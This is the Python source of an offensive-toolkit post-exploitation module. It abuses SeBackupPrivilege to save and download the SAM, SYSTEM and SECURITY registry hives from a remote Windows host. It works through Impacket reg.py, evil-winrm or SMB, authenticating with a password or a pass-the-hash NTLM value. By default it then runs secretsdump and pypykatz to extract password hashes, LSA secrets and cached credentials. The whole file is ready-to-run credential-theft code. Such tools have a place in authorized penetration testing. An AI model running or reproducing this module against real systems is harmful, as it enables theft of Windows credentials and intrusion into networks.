"""
SeBackupPrivilege Registry Hive Dump
Extract SAM, SYSTEM, SECURITY hives using SeBackupPrivilege
"""

import os
from core.module_base import ModuleBase, ModuleType, Platform


class SeBackupDump(ModuleBase):
    """
    Extract registry hives using SeBackupPrivilege.

    When you have SeBackupPrivilege, you can read any file including:
    - SAM (local user hashes)
    - SYSTEM (bootkey for decryption)
    - SECURITY (LSA secrets, cached creds)

    Methods:
    1. reg.py (Impacket) - Remote registry extraction
    2. WinRM - Use evil-winrm to run reg save commands
    3. SMB - Copy pre-saved hives from target
    """

    def __init__(self):
        super().__init__()
        self.name = "sebackup_dump"
        self.description = "Extract registry hives via SeBackupPrivilege"
        self.author = "UwU Toolkit"
        self.version = "1.0.0"
        self.module_type = ModuleType.POST
        self.platform = Platform.WINDOWS
        self.tags = ["privilege", "sebackup", "registry", "sam", "hive", "dump", "secretsdump"]
        self.references = [
            "https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges#sebackupprivilege",
            "https://www.hackingarticles.in/windows-privilege-escalation-sebackupprivilege/",
            "https://github.com/giuliano108/SeBackupPrivilege"
        ]

        # Target options
        self.register_option("RHOSTS", "Target host", required=True)
        self.register_option("USER", "Username with SeBackupPrivilege", required=True)
        self.register_option("PASS", "Password", default="")
        self.register_option("HASH", "NTLM hash (alternative to password)", default="")
        self.register_option("DOMAIN", "Domain", default="")

        # Method options
        self.register_option("METHOD", "Extraction method",
                           default="reg.py",
                           choices=["reg.py", "winrm", "smb"])

        # Output
        self.register_option("OUTPUT_DIR", "Local directory to save hives", default="hives")
        self.register_option("REMOTE_PATH", "Remote temp path for hive saves (use 'auto' for user's Documents)", default="auto")

        # Post-extraction
        self.register_option("AUTO_DUMP", "Auto-run secretsdump/pypykatz on hives",
                           default="yes", choices=["yes", "no"])
        self.register_option("DUMP_TOOL", "Tool for local extraction",
                           default="both", choices=["secretsdump", "pypykatz", "both"])

    def _resolve_remote_path(self, user: str) -> str:
        """Resolve REMOTE_PATH - 'auto' becomes user's Documents folder"""
        remote_path = self.get_option("REMOTE_PATH")
        if remote_path.lower() == "auto":
            # Use the authenticated user's Documents folder
            return f"C:\\Users\\{user}\\Documents"
        return remote_path

    def run(self) -> bool:
        target = self.get_option("RHOSTS")
        user = self.get_option("USER")
        password = self.get_option("PASS")
        ntlm_hash = self.get_option("HASH")
        domain = self.get_option("DOMAIN")
        method = self.get_option("METHOD")
        output_dir = self.get_option("OUTPUT_DIR")

        # Resolve output path
        if self._config:
            output_dir = self._config.resolve_path(output_dir)

        os.makedirs(output_dir, exist_ok=True)

        self.print_status(f"Target: {target}")
        self.print_status(f"User: {domain}\\{user}" if domain else f"User: {user}")
        self.print_status(f"Method: {method}")
        self.print_status(f"Output: {output_dir}")
        self.print_line()

        # Validate auth
        if not password and not ntlm_hash:
            self.print_error("Either PASS or HASH is required")
            return False

        success = False

        if method == "reg.py":
            success = self._extract_reg_py(target, user, password, ntlm_hash, domain, output_dir)
        elif method == "winrm":
            success = self._extract_winrm(target, user, password, ntlm_hash, domain, output_dir)
        elif method == "smb":
            success = self._extract_smb(target, user, password, ntlm_hash, domain, output_dir)

        if not success:
            return False

        # Verify files exist (check inside container)
        hive_files = ["sam", "system", "security"]
        found_files = []
        for hive in hive_files:
            hive_path = os.path.join(output_dir, hive)
            # Check file inside container
            ret, stdout, _ = self.run_in_exegol(f"ls -la '{hive_path}' 2>/dev/null", timeout=10)
            if ret == 0 and stdout.strip():
                # Parse size from ls output
                parts = stdout.split()
                size = parts[4] if len(parts) > 4 else "?"
                self.print_good(f"  {hive}: {size} bytes")
                found_files.append(hive_path)
            else:
                self.print_warning(f"  {hive}: not found")

        if len(found_files) < 2:
            self.print_error("Failed to extract required hives (need at least SAM + SYSTEM)")
            return False

        # Auto-dump secrets
        if self.get_option("AUTO_DUMP") == "yes":
            dump_tool = self.get_option("DUMP_TOOL")
            self.print_line()

            if dump_tool in ["secretsdump", "both"]:
                self._run_secretsdump(output_dir, found_files)

            if dump_tool in ["pypykatz", "both"]:
                self.print_line()
                self._run_pypykatz(output_dir, found_files)

        self.print_line()
        self.print_good("Hives saved to: " + output_dir)
        self.print_status("Manual extraction:")
        self.print_line(f"  secretsdump.py -sam {output_dir}/sam -system {output_dir}/system -security {output_dir}/security LOCAL")

        return True

    def _extract_reg_py(self, target: str, user: str, password: str,
                        ntlm_hash: str, domain: str, output_dir: str) -> bool:
        """Extract hives using Impacket's reg.py"""
        self.print_status("Using reg.py (Impacket) for remote extraction...")

        # Build auth string
        if domain:
            auth = f"{domain}/{user}"
        else:
            auth = user

        if ntlm_hash:
            auth += f" -hashes :{ntlm_hash}"
        else:
            auth += f":{password}"

        hives = ["SAM", "SYSTEM", "SECURITY"]
        success_count = 0

        for hive in hives:
            self.print_status(f"Saving {hive}...")
            local_file = os.path.join(output_dir, hive.lower())

            if ntlm_hash:
                cmd = f"reg.py '{domain}/{user}@{target}' -hashes ':{ntlm_hash}' save -keyName 'HKLM\\{hive}' -o '{local_file}'"
            else:
                cmd = f"reg.py '{domain}/{user}:{password}@{target}' save -keyName 'HKLM\\{hive}' -o '{local_file}'"

            ret = self.run_in_exegol_stream(cmd, timeout=120)

            if ret == 0 and os.path.exists(local_file):
                self.print_good(f"  {hive} saved")
                success_count += 1
            else:
                self.print_warning(f"  {hive} failed")

        return success_count >= 2

    def _extract_winrm(self, target: str, user: str, password: str,
                       ntlm_hash: str, domain: str, output_dir: str) -> bool:
        """Extract hives via WinRM using reg save commands"""
        self.print_status("Using evil-winrm for extraction...")

        # Use C:\Temp as remote path
        remote_path = "C:\\Temp"
        self.print_status(f"Remote path: {remote_path}")

        # Build evil-winrm command - use full path since it's an alias in Exegol
        evilwinrm = "/usr/local/rvm/gems/ruby-3.1.2@evil-winrm/wrappers/ruby /usr/local/rvm/gems/ruby-3.1.2@evil-winrm/bin/evil-winrm"

        if ntlm_hash:
            auth_args = f"-i {target} -u '{user}' -H '{ntlm_hash}'"
        else:
            auth_args = f"-i {target} -u '{user}' -p '{password}'"

        # PowerShell commands to run
        ps_commands = [
            "mkdir C:\\Temp -Force",
            "reg save HKLM\\SAM C:\\Temp\\sam /y",
            "reg save HKLM\\SYSTEM C:\\Temp\\system /y",
            "reg save HKLM\\SECURITY C:\\Temp\\security /y"
        ]

        self.print_status("Saving registry hives on target...")

        # Run all commands via evil-winrm using echo pipe
        for ps_cmd in ps_commands:
            hive_name = ps_cmd.split("\\")[-1].split()[0] if "HKLM" in ps_cmd else "mkdir"
            self.print_status(f"  {hive_name}...")

            # Pipe command to evil-winrm
            cmd = f"echo '{ps_cmd}' | {evilwinrm} {auth_args} 2>/dev/null | grep -v 'Evil-WinRM' | grep -v 'Info:' | grep -v '^$'"
            ret, stdout, stderr = self.run_in_exegol(cmd, timeout=60)

            if "successfully" in stdout.lower() or "force" in ps_cmd.lower():
                self.print_good(f"    OK")
            elif ret != 0:
                self.print_warning(f"    May have failed")

        # Download hives via evil-winrm
        self.print_status("Downloading hives via evil-winrm...")

        # Ensure output dir exists in container
        self.run_in_exegol(f"mkdir -p '{output_dir}'", timeout=10)

        hive_names = ["sam", "system", "security"]
        success_count = 0

        # Build download commands - cd to C:\Temp first, then download each file
        download_cmds = "cd C:\\\\Temp\\n"
        for hive in hive_names:
            local_file = os.path.join(output_dir, hive)
            download_cmds += f"download {hive} {local_file}\\n"

        self.print_status("  Running downloads...")
        cmd = f"echo -e '{download_cmds}' | {evilwinrm} {auth_args}"
        ret = self.run_in_exegol_stream(cmd, timeout=180)

        # Check which files were downloaded
        for hive in hive_names:
            local_file = os.path.join(output_dir, hive)
            check_cmd = f"ls -la '{local_file}' 2>/dev/null"
            ret2, stdout2, _ = self.run_in_exegol(check_cmd, timeout=10)
            if ret2 == 0 and stdout2.strip() and "No such file" not in stdout2:
                parts = stdout2.split()
                size = parts[4] if len(parts) > 4 else "?"
                success_count += 1
                self.print_good(f"    {hive} downloaded ({size} bytes)")
            else:
                self.print_warning(f"    {hive} download failed")

        return success_count >= 2

    def _extract_smb(self, target: str, user: str, password: str,
                     ntlm_hash: str, domain: str, output_dir: str) -> bool:
        """Download pre-saved hives from target via SMB"""
        self.print_status("Downloading hives via SMB...")
        self.print_warning("Assumes hives are already saved on target")

        remote_path = self._resolve_remote_path(user)
        self.print_status(f"Remote path: {remote_path}")

        # Build SMB auth
        if domain:
            if ntlm_hash:
                smb_auth = f"{domain}/{user}@{target} -hashes :{ntlm_hash}"
            else:
                smb_auth = f"{domain}/{user}:{password}@{target}"
        else:
            if ntlm_hash:
                smb_auth = f"{user}@{target} -hashes :{ntlm_hash}"
            else:
                smb_auth = f"{user}:{password}@{target}"

        # Convert path for share access (C:\Windows\Temp -> C$/Windows/Temp)
        share_path = remote_path.replace("C:\\", "C$/").replace("\\", "/")

        hives = ["sam", "system", "security"]
        success_count = 0

        for hive in hives:
            local_file = os.path.join(output_dir, hive)
            remote_file = f"/{share_path}/{hive}"

            self.print_status(f"Downloading {hive}...")

            # Use smbclient.py
            cmd = f"echo 'get {remote_file}' | smbclient.py '{smb_auth}'"
            ret, stdout, stderr = self.run_in_exegol(cmd, timeout=60)

            # Move downloaded file to output dir
            if os.path.exists(hive):
                os.rename(hive, local_file)
                success_count += 1
                self.print_good(f"  Downloaded: {hive}")
            elif os.path.exists(local_file):
                success_count += 1
                self.print_good(f"  Downloaded: {hive}")
            else:
                self.print_warning(f"  Failed: {hive}")

        return success_count >= 2

    def _run_secretsdump(self, output_dir: str, found_files: list) -> None:
        """Run secretsdump on extracted hives"""
        self.print_status("Running secretsdump on hives...")

        sam_path = os.path.join(output_dir, "sam")
        system_path = os.path.join(output_dir, "system")
        security_path = os.path.join(output_dir, "security")

        cmd = f"secretsdump.py -sam {sam_path} -system {system_path}"
        if security_path in found_files:
            cmd += f" -security {security_path}"
        cmd += " LOCAL"

        self.print_line()
        ret = self.run_in_exegol_stream(cmd, timeout=60)

        if ret == 0:
            self.print_good("Secrets extracted successfully (secretsdump)")
        else:
            self.print_warning("secretsdump failed - try running manually")

    def _run_pypykatz(self, output_dir: str, found_files: list) -> None:
        """Run pypykatz on extracted hives for local extraction"""
        self.print_status("Running pypykatz on hives...")

        sam_path = os.path.join(output_dir, "sam")
        system_path = os.path.join(output_dir, "system")
        security_path = os.path.join(output_dir, "security")

        # pypykatz registry command - system path is positional arg
        cmd = f"pypykatz registry {system_path} --sam {sam_path}"
        if security_path in found_files:
            cmd += f" --security {security_path}"

        self.print_line()
        ret = self.run_in_exegol_stream(cmd, timeout=60)

        if ret == 0:
            self.print_good("Secrets extracted successfully (pypykatz)")
        else:
            self.print_warning("pypykatz failed - try running manually")
            self.print_status(f"  pypykatz registry {system_path} --sam {sam_path}")

    def check(self) -> bool:
        """Check if required tools are available"""
        ret, stdout, stderr = self.run_in_exegol("which reg.py secretsdump.py", timeout=10)
        return ret == 0
